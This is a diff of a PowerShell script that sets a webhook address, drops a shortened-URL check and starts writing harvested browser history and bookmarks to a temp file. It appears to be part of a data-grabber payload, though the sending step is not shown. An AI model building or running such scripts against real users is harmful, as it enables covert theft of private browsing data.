@@ -1,10 +1,7 @@
 ﻿
 $whuri = "$dc"
 
-# shortened URL Detection
-if ($whuri.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $whuri = (irm $whuri).url}
-
-$outpath = "$env:temp\history.txt"
+$outpath = "$env:temp\browser_history.txt"
 "Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII
 
 # Define the Regular expression for extracting history and bookmarks
